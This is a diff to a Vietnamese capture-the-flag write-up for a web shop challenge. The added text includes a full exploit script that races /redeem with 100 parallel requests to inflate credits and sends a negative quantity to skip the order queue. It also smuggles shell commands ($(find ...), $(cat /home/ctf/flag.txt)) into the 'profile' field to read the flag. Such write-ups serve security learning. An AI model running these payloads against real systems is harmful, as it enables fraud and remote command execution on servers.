@@ -75,7 +75,7 @@ Vary: Cookie
           <span>Credits</span>
           <strong>¢2</strong>
 ```
-Nếu loại bỏ giá trị cookie khi POST, server sẽ tự tạo ra một cookie mới và cộng vào đó 2 credits
+Nếu loại bỏ giá trị cookie khi POST, server sẽ tự tạo ra một cookie mới và ta có thể cộng vào đó 2 credits qua /redeem
 ```
 POST /redeem HTTP/1.1
 Host: 34.179.250.187:32707
@@ -140,7 +140,7 @@ curl -s -b session.txt -H "User-Agent: $UA" "$TARGET/" | grep -o '¢[0-9]*' | he
 > Kết quả kiểm tra: 
 ```
 thong7021@Senadina ~ % curl -s -b session.txt -H "User-Agent: $UA" "$TARGET/" | grep -o '¢[0-9]*' | head -1
-¢20
+¢64
 ```
 Vậy là có thể chiếm được credits bằng cách này [2]
 
@@ -181,6 +181,7 @@ Checkout không trả kết quả ngay, mà queue:
 ```json
 {"balance":8,"cost":20,"eta":1891,"ok":true,"order_id":"b4a18b233215","result":null,"status":"queued"}
 ```
+> Số `balance` có thể khác tùy thuộc vào bước Race Condition /redeem ở trên
 `eta` ~31 phút, poll lại `/orders/<id>` nhiều lần thì `eta` không hề giảm theo thời gian thực — không có worker chạy nền, order chỉ "done" khi hết hạn tính từ `created_at`.
 
 > Thử thao túng `quantity` — dù đã biết cost premium luôn cố định (không bị bug `quantity≤0→cost=1` như item thường), nhưng đặt câu hỏi: `eta` có tính dựa vào `quantity` không? Bắn thử giá trị âm cực lớn:
@@ -195,7 +196,7 @@ Kết quả:
 ```json
 {"balance":12,"cost":20,"eta":-85997924,"ok":true,"order_id":"65e6ccecc53d","result":"profile rejected:/home/ctf/flag.txt\n/proc/kpageflags","status":"done"}
 ```
-`eta` tràn âm khổng lồ — integer overflow trong công thức tính eta dựa theo `quantity` — server coi order quá hạn từ lâu nên xử lý **ngay lập tức** thay vì phải đợi 31 phút, và lộ luôn path flag trong `result`: `/home/ctf/flag.txt` [4]
+`eta` tràn âm khổng lồ — không validate, trong công thức chỉ tính eta dựa theo `quantity` — server coi order quá hạn từ lâu nên xử lý **ngay lập tức** thay vì phải đợi 31 phút, và lộ luôn path flag trong `result`: `/home/ctf/flag.txt` [4]
 
 ### Lấy flag
 ```bash
@@ -216,3 +217,42 @@ curl -s -b session.txt -X POST "$TARGET/checkout" \
 > 2. **Client-side-only restriction** trên field `profile`: `<select>` chỉ chặn ở HTML/JS, server không validate lại whitelist trước khi đưa vào subprocess.
 > 3. **Command Injection**: `profile_check.py` dùng `subprocess.run(..., shell=True)` với f-string không escape → `$(...)` command substitution chạy được dù nằm trong double-quote.
 > 4. **Thiếu validate** ở field `eta`: `eta` được tính trực tiếp từ`quantity`, nên khi `quantity` âm cực lớn làm phép tính eta tràn số, bypass hàng đợi async, ép order xử lý ngay lập tức.
+
+## Script tổng thể và lưu ý một số bước
+### Script
+```
+#1.Thay đổi TARGETIP và TARGETHOST tùy vào ip và host thật của instance, thay đổi trình duyệt tùy vào trình duyệt thực tế
+TARGET="http://<TARGETIP>:<TARGETHOST>"
+UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36" # Trình duyệt của tôi
+
+#2. Gửi đồng thời 100 requests để chiếm credits
+for i in $(seq 1 100); do
+  curl -s -b session.txt -X POST "$TARGET/redeem" \
+    -H "User-Agent: $UA" \
+    -H "Accept: text/html,application/xhtml+xml" \
+    -H "Referer: $TARGET/" &
+done
+wait
+
+#3. Kiểm tra balance
+echo "===THIS SESSION BALANCE==="
+curl -s -b session.txt -H "User-Agent: $UA" "$TARGET/" | grep -o '¢[0-9]*' | head -1
+
+#4. Tìm flag, có thể bỏ qua bước này và sang luôn bước sau nếu có đường dẫn flag
+bash
+curl -s -b session.txt -X POST "$TARGET/checkout" \
+  -H "User-Agent: $UA" \
+  --data-urlencode "item_id=zero_day_debugger" \
+  --data-urlencode "quantity=-999999" \
+  --data-urlencode 'profile=$(find / -maxdepth 3 -iname "*flag*" 2>/dev/null)'
+#5. Đọc flag
+  curl -s -b session.txt -X POST "$TARGET/checkout" \
+  -H "User-Agent: $UA" \
+  --data-urlencode "item_id=zero_day_debugger" \
+  --data-urlencode "quantity=-999999" \
+  --data-urlencode 'profile=$(cat /home/ctf/flag.txt 2>&1)'
+  ```
+### Lưu ý
+> 1. Balance có thể không giống nhau mỗi lần thử do rớt gói tin, tốt nhất một session nên có ít nhất 40+ credits để chạy script hoàn chỉnh với find, hoặc 20+ credits nếu chỉ cần đọc flag
+> 2. Về header của trình duyệt ở bước 1 có thể thử bỏ, ở đây nếu mình bỏ thì bị dính AI check của challenge khá quê
+
